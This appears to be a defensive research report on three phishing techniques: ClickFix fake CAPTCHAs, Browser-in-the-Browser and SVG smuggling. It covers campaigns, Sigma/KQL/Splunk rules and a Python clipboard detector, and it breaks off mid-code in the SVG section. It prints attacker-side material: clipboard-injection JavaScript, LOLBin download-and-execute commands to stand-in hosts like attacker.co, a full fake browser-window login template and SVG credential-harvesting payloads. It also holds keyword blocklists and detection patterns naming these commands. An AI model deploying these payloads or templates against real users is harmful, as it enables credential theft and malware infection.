# Deep Research: Three Emerging Phishing Vectors
## ClickFix / FakeCaptcha · Browser-in-the-Browser · SVG Phishing
### 2024–2026 Technical Intelligence Report

> **Sources:** Microsoft Security Blog, Splunk/ClickGrab, Unit 42 (Palo Alto), SentinelOne, IBM X-Force, VMRay, Cloudflare Force-One, Eye Security, CYFIRMA, Virus Bulletin VB2025, Menlo Security, Ontinue Threat Research, 360 Privacy Cyber, OPSWAT, mrd0x (BitB originator), Malwarebytes  
> **Compiled:** February 2026

---

## Table of Contents

1. [VECTOR 1: ClickFix / FakeCaptcha](#vector-1-clickfix--fakecaptcha)
   - [The Psychology](#11-the-psychology)
   - [Technical Mechanics](#12-technical-mechanics--the-clipboard-injection)
   - [Obfuscation Methods](#13-obfuscation-methods)
   - [Confirmed 2025 Campaigns](#14-confirmed-2025-campaigns)
   - [Nation-State Adoption](#15-nation-state-adoption)
   - [Detection Engineering](#16-detection-engineering)
   - [Open-Source Tooling](#17-open-source-tooling)
   - [How to Build a Detector](#18-how-to-build-a-detector)

2. [VECTOR 2: Browser-in-the-Browser (BitB)](#vector-2-browser-in-the-browser-bitb)
   - [Technical Architecture](#21-technical-architecture)
   - [The CSS/JS Illusion](#22-the-cssjs-illusion)
   - [DOM Detectability](#23-dom-detectability)
   - [Confirmed Campaigns](#24-confirmed-campaigns)
   - [PhaaS Enablement](#25-phaas-enablement-sneaky-2fa)
   - [Defences](#26-defences)

3. [VECTOR 3: SVG-Based Phishing](#vector-3-svg-based-phishing)
   - [Why SVGs Work](#31-why-svgs-work)
   - [Payload Delivery Methods](#32-payload-delivery-methods-all-four-variants)
   - [Email Gateway Bypass](#33-email-gateway-bypass-mechanics)
   - [Complete Kill Chain](#34-complete-kill-chain)
   - [2025 Campaigns](#35-confirmed-2025-campaigns)
   - [Zero-Click OWA Variant](#36-zero-click-owa-variant-most-dangerous)
   - [Detection Rules](#37-detection-rules)
   - [Chaining with Other Techniques](#38-chaining-with-other-techniques)

4. [Cross-Vector Comparison](#cross-vector-comparison)
5. [Portfolio Tool Opportunities](#portfolio-tool-opportunities)

---

## VECTOR 1: ClickFix / FakeCaptcha

> **Headline stat:** ClickFix accounted for **47% of all initial access methods** observed by Microsoft in 2025 (Microsoft Digital Defense Report). It is the single most-used initial access technique globally, overtaking traditional phishing links and malicious attachments.  
> **ClearFake campaign alone:** 147,521 systems infected since late August 2025 (Expel analysis).  
> **Attribution breadth:** Adopted by criminal groups, ransomware affiliates, and nation-state actors including APT28, Kimsuky, MuddyWater (Virus Bulletin VB2025).

---

### 1.1 The Psychology

ClickFix is not a technical exploit. It is a social engineering attack that achieves code execution without a single CVE. Understanding why users comply is the most important layer for both defence and user training design.

**Why it works — five psychological levers:**

**1. Authority via familiar interface**  
CAPTCHAs have trained users to comply with verification challenges without question. They are presented by security systems, presented to prove you are human, and universally associated with legitimate protection. Attacking this conditioned response is the core innovation. Victims *believe they are completing a security step*, not bypassing one.

**2. Verification fatigue**  
Modern users encounter dozens of CAPTCHA-style challenges per day. The cognitive burden of evaluating each one is high, so users develop heuristic shortcuts: *"This looks like a CAPTCHA → follow the steps → move on."* The attack exploits this shortcut. (SentinelOne: "ClickFix relies on user fatigue with anti-spam mechanisms.")

**3. Technical legitimacy of keyboard shortcuts**  
Instructing users to press Win+R then Ctrl+V then Enter feels like a system-level, official operation — not a browser action. The keyboard sequence invokes the Windows Run dialog, a trusted system utility that most users associate with IT departments and legitimate administration. The instruction makes the action feel authoritative and procedural.

**4. The Diversion String**  
When the malicious command is in the clipboard, victims *see* a harmless-looking string if they peek: e.g., `✓ "I am a human - Cloudflare RayID: 9802b213d92d0eaa"`. This visible decoy content masks the true payload. Only what gets executed is malicious.

**5. Final comment camouflage**  
Attackers append a human-readable comment to the end of the script that is displayed during execution: for example, `Cloud Identificator: 2031` (documented in the Latrodectus campaign, Unit 42). The victim sees this text and interprets it as part of a normal authentication flow. The actual multi-stage malware is already running in memory.

---

### 1.2 Technical Mechanics — The Clipboard Injection

The attack relies entirely on a browser-native JavaScript API: the **Clipboard API** (`navigator.clipboard.writeText()`) or the legacy `document.execCommand('copy')`. Both are available to any webpage that has DOM focus — no exploit required.

**The exact JavaScript mechanism (from SentinelOne and CYFIRMA analysis):**

```javascript
// Method 1: Modern Clipboard API — most common in 2025
document.getElementById('captcha-btn').addEventListener('click', function() {
  // User clicks the "I'm not a robot" button
  // Payload is written silently, before any UI feedback
  navigator.clipboard.writeText(
    "powershell -WindowStyle Hidden -EncodedCommand " +
    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYw..." // Base64 payload
  );
  
  // Now show the "verification steps" UI to the user
  document.getElementById('instructions').style.display = 'block';
});

// Method 2: Legacy execCommand — older campaigns, wider browser compat
function copyPayload() {
  var textarea = document.createElement('textarea');
  textarea.value = maliciousCommand;
  textarea.style.position = 'fixed';
  textarea.style.opacity = '0';
  document.body.appendChild(textarea);
  textarea.focus();
  textarea.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
}
```

**What the user sees vs. what is in the clipboard:**

| User Interface | Clipboard Content |
|----------------|------------------|
| `✓ Cloudflare RayID: 9802b213d92d0eaa` | `mshta https://attacker.co/payload.hta =+\abc123` |
| `Verification complete — follow steps` | `powershell -WindowStyle Hidden -c "IEX(IWR 'https://c2.evil/s')"` |
| `Cloud Identificator: 2031` | Full multi-stage PowerShell downloader (Latrodectus) |

**Standard instruction variants observed in the wild:**

```
Variant A — Windows Run dialog:
"Press Win+R, then press Ctrl+V, then press Enter"

Variant B — PowerShell terminal:  
"Press Win+X, select Windows Terminal, paste and press Enter"

Variant C — macOS/Linux:
"Open Terminal (Cmd+Space, type 'terminal'), paste, press Return"

Variant D — Social media content creators (Sept 2025 campaign):
"To complete badge verification, copy your authentication token 
 from browser cookies into this form field"
```

**The most common executed LOLBins (Living Off the Land Binaries):**

```
mshta.exe        → Downloads and executes HTA files: mshta https://attacker[.]co/xxxx
powershell.exe   → -WindowStyle Hidden -EncodedCommand [Base64]
                    -ExecutionPolicy Bypass -c "IEX(IWR 'url')"
msiexec.exe      → /i https://attacker[.]co/payload.msi /quiet
certutil.exe     → -urlcache -split -f https://attacker/file.b64 output.exe
curl.exe         → curl https://attacker/s.ps1 | powershell
SyncAppvPublishingServer.vbs  → Used in EtherHiding/ClearFake variant to
                                 fetch next-stage JS from Binance BSC smart contracts
```

---

### 1.3 Obfuscation Methods

2025 ClickFix campaigns use layered obfuscation that makes static detection extremely difficult. From Microsoft Security Blog and Virus Bulletin VB2025 analysis:

**Layer 1 — JavaScript obfuscation:**
```javascript
// Encoded arrays with runtime reconstruction
var _0xA2F3 = ['\x70\x6F\x77\x65\x72\x73\x68\x65\x6C\x6C', ...];
var payload = _0xA2F3[0] + ' -WindowStyle ' + _0xA2F3[1] + ...;

// Variable name obfuscation (documented Latrodectus variant)
var var_Apple_Palantir38 = "...";
var func_Slack_encryption84 = function() { ... };
```

**Layer 2 — Payload encoding:**
- Base64 (`-EncodedCommand`) — most common
- Hex encoding of string literals
- XOR with rotating key
- Multiple layers combined: Base64 → RC4 decrypt → execute

**Layer 3 — Infrastructure evasion:**
- **EtherHiding** (ClearFake campaign): JavaScript payload retrieved from Binance BNB Smart Chain smart contracts — not a traditional URL that can be blocked
- **jsDelivr CDN**: Final payload hosted on `cdn.jsdelivr.net` — a trusted CDN exempt from most blocklists
- **One-time-use URLs**: Each MSHTA URL is unique per target. After execution, the URL becomes invalid, preventing sandbox re-detonation

**Layer 4 — Behavioural evasion:**
```javascript
// Check for sandbox environment before executing
if (navigator.webdriver) { showBenignPage(); return; }
if (window.callPhantom || window._phantom) { redirect('https://google.com'); return; }
if (document.documentElement.clientWidth < 100) { return; } // Headless browser detection
```

---

### 1.4 Confirmed 2025 Campaigns

| Threat Actor | Campaign | Payload | Lure Theme | Targets | Date | Source |
|-------------|----------|---------|------------|---------|------|--------|
| Storm-0426 | Prometheus TDS | MintsLoader | Payment/invoice from web hosting provider | Germany | March 2025 | Microsoft |
| Unnamed (Lampion cluster) | Fake Portuguese tax site | Lampion banking stealer | Tax authority compliance | Portugal, Switzerland, Luxembourg, France, Hungary, Mexico | May–Jun 2025 | Microsoft |
| Unnamed (Lumma cluster) | Movie streaming redirect | Lumma Stealer | Free movie access, pirated content | Global — tens of thousands/day | April 2025 | Unit 42 |
| ClearFake infrastructure | EtherHiding via BNB chain | Amatera Stealer | Browser error/fake fix | Global | Aug–Oct 2025 | Expel, Hacker News |
| Storm-1865 | Social media verification | Unknown | "Free verified badge" for creators | Social media content creators | Sept 2025+ | Microsoft |
| Unknown (StealC campaign) | Fake Cloudflare verification | StealC infostealer | Browser security check on compromised sites | General enterprise | Feb 2026 | LevelBlue/SpiderLabs |
| Latrodectus operators | ClearFake redirects | Latrodectus → Lumma Stealer | Compromised legitimate websites | Broad | March–April 2025 | Unit 42 |
| Unknown | Spectrum ISP impersonation | Unknown | Cable/internet provider verification | US | Late May 2025+ | Microsoft |

**Final payloads observed (all confirmed 2025):**
- **Lumma Stealer** — most common; targets browser credentials, crypto wallets, Steam
- **NetSupport RAT** — remote access for persistent control
- **Latrodectus** — modular backdoor replacing IcedID
- **AsyncRAT** — remote access, keylogging
- **StealC v2** — C++ rewrite with RC4 encryption; injects into `svchost.exe`
- **MintsLoader** — loader-only; downloads next-stage based on target profiling

---

### 1.5 Nation-State Adoption

ClickFix is no longer a criminal-only technique. Virus Bulletin VB2025 confirmed attribution across:

| Group | Classification | Confirmed |
|-------|---------------|-----------|
| **APT28** (Fancy Bear, Russia) | State-sponsored | ✓ VB2025 |
| **Kimsuky** (North Korea) | State-sponsored | ✓ VB2025 |
| **MuddyWater** (Iran) | State-sponsored | ✓ VB2025 |
| **Storm-0426** | Criminal/RaaS affiliate | ✓ Microsoft |
| **Storm-1865** | Criminal | ✓ Microsoft |
| **TA558** | Criminal (hospitality/fintech) | ✓ Multiple |

---

### 1.6 Detection Engineering

**EDR/SIEM — What Behavioural Signals to Hunt:**

The core detection principle: **a browser process spawning a system shell is abnormal**. No legitimate CAPTCHA ever requires users to open PowerShell.

```kql
// KQL — Microsoft Sentinel: Browser spawning LOLBin execution
DeviceProcessEvents
| where InitiatingProcessFileName in~ ('chrome.exe', 'firefox.exe', 
        'msedge.exe', 'brave.exe', 'opera.exe')
| where FileName in~ ('powershell.exe', 'mshta.exe', 'cmd.exe', 
        'msiexec.exe', 'certutil.exe', 'wscript.exe', 'cscript.exe',
        'SyncAppvPublishingServer.exe', 'regsvr32.exe', 'msbuild.exe')
| where ProcessCommandLine has_any ('-WindowStyle', 'Hidden', 'EncodedCommand',
        'IEX', 'IWR', 'Invoke-Expression', 'Invoke-WebRequest', 'DownloadString')
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName
```

```splunk
# Splunk SPL — ClickFix clipboard-to-execution pattern
# (Michael Haag, Splunk, Nov 2025)
| tstats count min(_time) as firstTime max(_time) as lastTime
    FROM datamodel=Endpoint.Processes
    WHERE Processes.process_name IN ("powershell.exe","mshta.exe","cmd.exe")
        AND Processes.process IN ("*-WindowStyle*Hidden*", "*mshta*http*",
                                   "*EncodedCommand*", "*SyncAppvPublishing*")
        AND Processes.parent_process_name IN ("chrome.exe","firefox.exe",
                                               "msedge.exe","explorer.exe")
| eval firstTime=strftime(firstTime,'%Y-%m-%dT%H:%M:%S')
| table Processes.dest Processes.user Processes.process_name 
        Processes.process firstTime lastTime
```

```yaml
# Sigma Rule — ClickFix MSHTA download via browser interaction
title: ClickFix_MSHTA_Download_From_Browser
id: cf82b4e9-1f31-4d2a-a8c9-2f4e7b1d0e15
status: experimental
description: Detects mshta.exe downloading remote payload after browser interaction
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\chrome.exe'
      - '\firefox.exe'
      - '\msedge.exe'
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection
falsepositives:
  - Legitimate enterprise MSHTA usage from browsers (rare)
level: high
tags:
  - attack.execution
  - attack.t1218.005
  - attack.initial_access
  - attack.t1566
```

**Group Policy / Windows Hardening:**
```
# Block mshta.exe via Windows Defender Application Control (WDAC)
# or AppLocker
AppLocker → Executable Rules → Deny → %WINDIR%\system32\mshta.exe for all non-admin users

# Restrict PowerShell execution policy via GPO
Computer Configuration → Administrative Templates → 
  Windows Components → Windows PowerShell →
  Turn on Script Execution: Enabled → "Allow only signed scripts"

# Enable PowerShell Script Block Logging (catches encoded payloads)
Computer Configuration → Administrative Templates → 
  Windows Components → Windows PowerShell →
  Turn on PowerShell Script Block Logging: Enabled
```

---

### 1.7 Open-Source Tooling

**Currently available:**

**ClickGrab** (Michael Haag / Splunk, 2025)
- URL: `mhaggis.github.io/ClickGrab/`
- Type: Python + PowerShell analysis tool, NOT a user-facing defender
- Function: Collects potential threat URLs from URLhaus tagged "FakeCaptcha", opens them safely in browser, captures clipboard content after interaction, identifies payload patterns
- Key capability: `.\clickgrab.ps1 -Analyze -Tags "FakeCaptcha,ClickFix" -Limit 5`
- **Limitation:** Analysis/research tool only. Does not protect live users.

**ClickFix Block** (Eye Security, Oct 2025)
- Type: Chrome/Edge browser extension
- URL: `research.eye.security/clickfix-block-fake-captcha-attacks/`
- Function: Hooks JavaScript's native clipboard functions (`navigator.clipboard.writeText` and `document.execCommand`) via content script injection. Pattern-matches clipboard content against keyword blocklist: `cmd, msiexec, powershell, pwsh, iex, mshta, not a robot, captcha, human`
- "Block All" mode: Completely disables JavaScript copy-to-clipboard (preserves manual Ctrl+C)
- Mechanism: Content script runs on every page load — same injection model as password managers
- **Limitation:** Pattern-matching can be evaded by heavily obfuscated commands where keywords aren't in cleartext. Requires extension installation.

**PasteEater** (companion to ClickGrab)
- Intercepts items added to Windows clipboard at the OS level
- PowerShell-based monitoring complementing browser-layer detection

**odacavo/enhanced-iframe-protection** — browser extension for BitB (see Section 2)

---

### 1.8 How to Build a Detector

**Architecture for a production-grade ClickFix defender:**

```
Browser Layer (Chrome Extension):
  ├── Content Script: Hook navigator.clipboard.writeText()
  │   → Extract clipboard content BEFORE write completes
  │   → Pattern match Stage 1: keyword list (powershell, mshta, cmd, curl|bash, iex)
  │   → Pattern match Stage 2: structural regex (presence of -WindowStyle, -EncodedCommand,
  │       Base64 strings > 50 chars, URLs in command context)
  │   → Pattern match Stage 3: LOLBin presence (certutil, wscript, regsvr32, msbuild)
  │   → If match: BLOCK write, show warning modal, log telemetry
  │
  ├── Background Service Worker:
  │   → Maintain rolling blocklist from URLhaus feed (FakeCaptcha tag)
  │   → Domain reputation check for current page URL
  │   → Alert if current page domain registered < 30 days (RDAP API)
  │
  └── Warning Modal:
      → Plain language: "A website tried to put a dangerous command in your clipboard"
      → Show sanitised preview of what was attempted
      → Button: "Report this site" → auto-submits to URLhaus/PhishTank
  
Endpoint Layer (Python tray app):
  ├── pyperclip polling every 300ms
  ├── Same regex patterns as browser layer
  ├── On match: clear clipboard, show OS notification, write event log
  └── Optional: submit IOC to MISP/OpenCTI via PyMISP

SIEM Integration:
  ├── Browser extension ships telemetry to local SIEM endpoint
  ├── Correlated with EDR alert on browser→PowerShell process spawn
  └── STIX 2.1 IOC output for each blocked clipboard injection
```

```python
# Core detection engine — can serve both browser extension (via pywebview) 
# and standalone tray app

import re, time, pyperclip, logging
from dataclasses import dataclass
from typing import Optional

@dataclass
class ClipboardThreat:
    raw_content: str
    matched_pattern: str
    risk_score: float  # 0.0–1.0
    lolbin: Optional[str]
    has_encoded_payload: bool
    has_remote_url: bool

LOLBINS = [
    'mshta', 'powershell', 'pwsh', 'cmd', 'wscript', 'cscript',
    'certutil', 'msiexec', 'regsvr32', 'msbuild', 'installutil',
    'rundll32', 'SyncAppvPublishingServer'
]

PATTERNS = [
    (r'-[Ww]indow[Ss]tyle\s+[Hh]idden',                   0.9, 'Hidden PS window'),
    (r'-[Ee]ncodedCommand\s+[A-Za-z0-9+/=]{40,}',          0.95,'Base64 PS payload'),
    (r'[Ii]nvoke-[Ee]xpression|IEX\s*\(',                   0.85,'PS code execution'),
    (r'[Ii]nvoke-[Ww]eb[Rr]equest|IWR\s+["\']?https?://',  0.8, 'Remote download'),
    (r'curl\s+https?://[^\s]+\s*[\|;]\s*(bash|powershell)',  0.9, 'Pipe to shell'),
    (r'mshta\.exe\s+https?://',                              0.95,'MSHTA remote exec'),
    (r'certutil\s+-[Uu]rl[Cc]ache',                          0.85,'Certutil download'),
    (r'(SyncAppvPublishingServer|regsvr32|installutil)',      0.8, 'LOLBin abuse'),
    (r'atob\(["\'][A-Za-z0-9+/=]{40,}',                     0.8, 'JS atob decode'),
]

def analyse_clipboard(content: str) -> Optional[ClipboardThreat]:
    content_lower = content.lower()
    best_score = 0.0
    best_pattern = None
    
    for pattern, score, label in PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            if score > best_score:
                best_score = score
                best_pattern = label
    
    if best_score == 0.0:
        return None
    
    lolbin_found = next(
        (lb for lb in LOLBINS if lb.lower() in content_lower), None
    )
    has_encoded = bool(re.search(r'[A-Za-z0-9+/=]{60,}', content))
    has_url = bool(re.search(r'https?://[^\s"\']{10,}', content))
    
    return ClipboardThreat(
        raw_content=content[:200] + '...' if len(content) > 200 else content,
        matched_pattern=best_pattern,
        risk_score=best_score,
        lolbin=lolbin_found,
        has_encoded_payload=has_encoded,
        has_remote_url=has_url
    )

def monitor_clipboard():
    prev = ''
    logging.basicConfig(level=logging.INFO)
    print("[ClickFix Defender] Monitoring clipboard...")
    
    while True:
        try:
            current = pyperclip.paste()
            if current != prev and current.strip():
                threat = analyse_clipboard(current)
                if threat:
                    logging.warning(f"THREAT BLOCKED | Score: {threat.risk_score:.0%} | "
                                    f"Pattern: {threat.matched_pattern} | "
                                    f"LOLBin: {threat.lolbin}")
                    pyperclip.copy('')  # Clear clipboard immediately
                    # In production: show OS notification, write to SIEM
                prev = current
        except Exception as e:
            logging.error(f"Error: {e}")
        time.sleep(0.3)

if __name__ == '__main__':
    monitor_clipboard()
```

---

## VECTOR 2: Browser-in-the-Browser (BitB)

> **Origin:** First documented by researcher mr.d0x (2022). First confirmed in-the-wild use: February 2020 (Zscaler — Steam credential theft campaign), making it a technique that predated its formal documentation.  
> **Current status (2025):** Active, adopted by PhaaS kits (Sneaky 2FA), used by state-linked actors (Ghostwriter/Belarus), and increasingly paired with AI-generated targeting for higher precision.

---

### 2.1 Technical Architecture

A BitB attack creates a **div-based fake browser window inside the DOM of an attacker-controlled webpage**. It does not open a real OS-level popup — it simulates one using CSS. The fundamental deception: users cannot drag the fake window outside the browser tab, but many never try.

**High-level structure (from mr.d0x's original documentation and mrd0x/BITB GitHub, 12K+ stars):**

```html
<!-- The outer page: attacker-controlled domain (e.g., steamoffer-prizes.com) -->
<html>
<body>
  <!-- Background overlay — darkens the real page to force focus on fake popup -->
  <div id="overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; 
       background:rgba(0,0,0,0.7); z-index:999;"></div>

  <!-- The fake browser window — the entire deception in one div -->
  <div id="fake-window" style="
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    width: 450px;
    height: 600px;
    border-radius: 8px 8px 0 0;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    z-index: 1000;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  ">
    <!-- Fake title bar — mimics Chrome/Windows window chrome -->
    <div class="title-bar" style="background:#dee1e6; padding:8px 12px; 
         border-radius:8px 8px 0 0; display:flex; align-items:center;">
      <!-- Fake traffic lights (macOS) or window controls (Windows) -->
      <div class="controls">
        <span style="background:#ff5f57; border-radius:50%; width:12px; 
              height:12px; display:inline-block; margin-right:6px;"></span>
        <span style="background:#febc2e; border-radius:50%; width:12px; 
              height:12px; display:inline-block; margin-right:6px;"></span>
        <span style="background:#28c840; border-radius:50%; width:12px; 
              height:12px; display:inline-block;"></span>
      </div>
    </div>

    <!-- Fake address bar — the core deception -->
    <div class="address-bar" style="background:#f1f3f4; padding:6px 12px; 
         display:flex; align-items:center; border-bottom:1px solid #dadce0;">
      <!-- Fake padlock icon (SVG or Unicode: 🔒) -->
      <span style="color:#188038; margin-right:6px; font-size:13px;">🔒</span>
      <!-- Fake URL — reads as legitimate but is static text, not a real URL -->
      <span style="color:#333; font-size:13px; font-weight:500;">
        accounts.google.com
      </span>
    </div>

    <!-- The actual phishing content — iframe to attacker server -->
    <iframe src="https://attacker-server.com/google-login" 
            style="width:100%; height:calc(100% - 70px); border:none;">
    </iframe>
  </div>
</body>
</html>
```

**The mrd0x GitHub template exposes four variables for customisation:**
```
XX-TITLE-XX         → Window title tab text (e.g., "Sign in — Google Accounts")
XX-DOMAIN-NAME-XX   → URL displayed in fake address bar (e.g., accounts.google.com)
XX-DOMAIN-PATH-XX   → Path shown (e.g., /signin/v2/identifier)
XX-PHISHING-LINK-XX → iframe src pointing to actual credential harvesting page
```

---

### 2.2 The CSS/JS Illusion — Component by Component

**What makes it convincing — each deception element:**

| Element | How Faked | Detection Difficulty |
|---------|-----------|---------------------|
| **Window chrome** | `div` with rounded corners, gradient background matching OS theme | Requires DOM inspection |
| **URL bar** | Static `<span>` text displaying legitimate domain | Cannot hover to verify — returns false site URL |
| **Padlock icon** | SVG image of lock, or Unicode `🔒`, coloured green `#188038` | Indistinguishable visually |
| **Tab title** | `document.title` of outer page set to match expected site | Visible in real browser tab |
| **Window animation** | jQuery `fadeIn()` or CSS transition — mimics natural popup delay | Adds psychological authenticity |
| **Drag behaviour** | Window draggable inside page using CSS `cursor:move` + JS drag handlers | **Can be dragged but cannot leave browser tab** — this is the primary tell |
| **OS-specific theme** | Detection via `navigator.userAgent` → serves Windows vs. macOS template | Adapts per visitor |
| **Login form** | iframe pointing to attacker credential harvesting server | Form action submits to attacker |

**The href-onclick evasion (mr.d0x):**

When hovering over a link on the attacker page, the browser status bar shows the `href` value. Attackers set a legitimate-looking `href` while using an `onclick` returning `false` to override actual navigation:

```html
<!-- Hovering shows: https://accounts.google.com -->
<!-- Clicking executes: opens BitB popup over current page -->
<a href="https://accounts.google.com" 
   onclick="showFakeBrowserWindow(); return false;">
  Sign in with Google
</a>
```

---

### 2.3 DOM Detectability

**Can BitB be detected by DOM inspection? Yes — with the right tools.**

**Manual detection methods (user-level):**
1. **The drag test:** Drag the popup to the edge of the browser viewport. A real OS popup window escapes the browser boundary. A BitB window is constrained within the tab — it cannot go beyond the browser chrome. This is the definitive physical test.
2. **Password manager autofill:** Password managers inject credentials based on the **actual page domain** (`document.location.hostname`). On a BitB page, the actual hostname is the attacker's domain. The password manager will NOT autofill. If it refuses to autofill, the login is likely fake.
3. **Right-click context menu:** In a real popup window, right-clicking shows "Inspect" and standard browser options. In a BitB iframe, right-click behaviour may be different or restricted.

**Programmatic DOM detection (for a browser extension):**

```javascript
// Detection method 1: Look for iframe overlaid by absolute/fixed positioned elements
// that contain text matching known legitimate domains
function detectBitBIframes() {
  const iframes = document.querySelectorAll('iframe');
  const suspiciousParents = [];
  
  for (const iframe of iframes) {
    const parent = iframe.parentElement;
    const parentStyle = window.getComputedStyle(parent);
    
    // Fixed/absolute positioned iframe containers = suspicious
    if (['fixed', 'absolute'].includes(parentStyle.position)) {
      // Check if sibling/parent divs contain spoofed domain text
      const textContent = parent.closest('[id*="window"],[id*="popup"],[class*="window"],[class*="popup"]')?.textContent || '';
      const legitimateDomains = ['google.com', 'microsoft.com', 'accounts.', 'login.'];
      
      if (legitimateDomains.some(d => textContent.includes(d))) {
        const actualIframeSrc = iframe.src;
        // If displayed text says google.com but iframe src isn't google.com → BitB
        if (!actualIframeSrc.includes('google.com')) {
          suspiciousParents.push({iframe, parent, displayedDomain: textContent.trim()});
        }
      }
    }
  }
  return suspiciousParents;
}

// Detection method 2: High z-index divs containing iframe + domain text
function detectHighZIndexOverlay() {
  const allElements = document.querySelectorAll('*');
  for (const el of allElements) {
    const style = window.getComputedStyle(el);
    const zIndex = parseInt(style.zIndex) || 0;
    
    if (zIndex > 500 && el.querySelector('iframe')) {
      // High z-index container with embedded iframe
      const innerText = el.innerText || '';
      if (/https?:\/\/[a-z0-9.-]+\.[a-z]{2,}/i.test(innerText)) {
        // Contains what appears to be a URL in display text
        console.warn('[BitB Detector] Suspicious high-z-index iframe container:', el);
      }
    }
  }
}
```

**The odacavo/enhanced-iframe-protection extension** (referenced by mr.d0x himself in the BITB GitHub repo) provides the most complete automated detection, flagging suspicious embedded iframe patterns.

---

### 2.4 Confirmed Campaigns

| Campaign | Date | Target | Platform Spoofed | Method | Source |
|----------|------|--------|-----------------|--------|--------|
| Steam CS:GO phishing | Feb 2020 | Gamers | Steam login | BitB popup on fake CS:GO tournament sites | Zscaler |
| Ghostwriter (Belarus) | 2022–2024 | Ukrainian users | passport.i.ua | BitB over compromised legitimate websites | Multiple |
| Steam CS2 campaign | Late 2024 | CS2 players | Steam login | BitB popup on malicious gaming sites; accounts worth thousands stolen | Perception Point |
| Developer Figma phishing | 2022–2025 | Software developers | Google OAuth | Fake Figma invite → BitB Google Sign-In → thousands of passwords stolen | Multiple |
| Pinata Cloud campaign | 2025 | Enterprise (Microsoft, Cisco) | Microsoft 365, Cisco | gateway.pinata.cloud hosted BitB + open Cisco Webex redirect | Menlo Security |
| Sneaky 2FA PhaaS | Nov 2025+ | M365 enterprise users | Microsoft 365 | Licensed BitB kit with per-OS adaptation + domain burn-and-replace | Malwarebytes |

**The Pinata Cloud campaign analysis (Menlo Security, Feb 2025) — notable for scale:**
- Hosted on `gateway[.]pinata[.]cloud` (IPFS gateway) — legitimate infrastructure
- Credential submission POSTed to `ortadogulular[.]com/support/shieldshots.php`
- Referring domains included `thulth[.]com` and `go.eu.sparkpostmail1[.]com` (legitimate email service)
- Emails contained victim names in URL paths for targeted pre-fill
- Discovered through a shared CDC fake landing page, revealing broader infrastructure

---

### 2.5 PhaaS Enablement: Sneaky 2FA

**Sneaky 2FA** (documented by Malwarebytes, November 2025) is the most significant development in BitB for 2025 — it packages BitB capability into a commercial Phishing-as-a-Service kit:

- **Business model:** Customers receive a licensed, obfuscated version of the source code and deploy it themselves
- **BitB capability:** Creates a "perfectly rendered address bar showing the legitimate website's URL" — the most convincing implementation documented
- **Per-visitor adaptation:** Fake window matches the visitor's OS and browser (detected server-side via User-Agent)
- **Anti-analysis:** Redirects security scanners and non-target visitors to harmless sites; only shows BitB to high-value targets
- **Domain lifecycle:** "Burn and replace" — domains are short-lived, constantly rotated ahead of blocklists
- **Result:** Traditional domain-based blocking cannot keep up with this infrastructure

---

### 2.6 Defences

**Ranked by effectiveness:**

**1. Password manager autofill (most practical)** — Password managers bind autofill to the actual `document.location.hostname`, not the displayed fake URL. If a password manager refuses to autofill, the login window is not on the domain it claims. This is automatic and requires no user action.

**2. FIDO2/WebAuthn hardware keys** — Origin-bound public key cryptography. The authentication cryptographically binds to the actual domain. An attacker cannot relay a FIDO2 authentication from `accounts.google.com` if the actual page is on `attacker.com`.

**3. Enhanced iframe protection extension** (odacavo/enhanced-iframe-protection) — Detects suspicious iframe overlays and warns users.

**4. Content Security Policy (CSP) for your own sites** — If you control the site being spoofed:
```
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```
This prevents your actual login page from being embedded inside an attacker's iframe. It does not prevent the fake window UI from being built in CSS/HTML.

**5. User training — the drag test** — Training users to drag suspicious popups to the edge of their browser screen. If it can't escape the tab, it's fake. This is the most reliable visual test that requires no tooling.

**6. Browser updates** — Modern browsers provide increasingly aggressive anti-phishing warnings, though BitB specifically avoids triggering these as it operates within a legitimate browser session.

---

## VECTOR 3: SVG-Based Phishing

> **Scale:** 47,000% surge in SVG phishing volume (Sublime Security, May 2025). KnowBe4 recorded a 245% increase Q4 2024 → Q1 2025. Peaked at **29.5% of all malicious email attachments** on March 4, 2025. MITRE formally assigned technique **T1027.017 (SVG Smuggling)**.  
> **Targeting:** Manufacturing and industrial sectors take the brunt (>50% of targeting, Cloudflare Force-One). Financial services closely behind. Both sectors handle high document volumes — perfect social pretext.

---

### 3.1 Why SVGs Work

SVG (Scalable Vector Graphics) is an **XML-based format that supports embedded JavaScript by design**. This is a documented, legitimate feature used for animations and interactivity in web applications. The attack exploits the gap between how security tools classify SVGs and what they technically are:

| Classification | Reality |
|---------------|---------|
| Email gateway sees: | `image/svg+xml` — safe image format |
| AV/sandbox sees: | Vector graphics file — low priority |
| Browser sees: | **Fully executable XML document with DOM access and JS execution** |

**The fundamental problem (VMRay, July 2025):**  
*"SVG files that lack semantic vector image content and consist entirely of JavaScript are an effective evasion technique. Formats like .js, .exe, or .html are commonly blocked by email gateways or upload filters — .svg files may pass through more easily."*

**Three JavaScript execution contexts within SVG:**
```xml
<!-- Method 1: <script> tag — direct JS execution -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    window.location.href = 'https://phishing-page.com/' + 
                           btoa(document.referrer);  // Encode referring URL for tracking
  </script>
</svg>

<!-- Method 2: <foreignObject> — embed full HTML inside SVG -->
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <foreignObject width="100%" height="100%">
    <xhtml:html>
      <!-- Full credential-harvesting HTML form rendered here -->
      <!-- No external requests until form submission -->
      <xhtml:form action="https://attacker.com/harvest" method="post">
        <xhtml:input name="password" type="password"/>
      </xhtml:form>
    </xhtml:html>
  </foreignObject>
</svg>

<!-- Method 3: Event handler + atob() decode chain -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image width="100%" height="100%" 
         href="data:image/png;base64,iVBORw0..." 
         onload="eval(atob('d2luZG93LmxvY2F0aW9u...'))" />
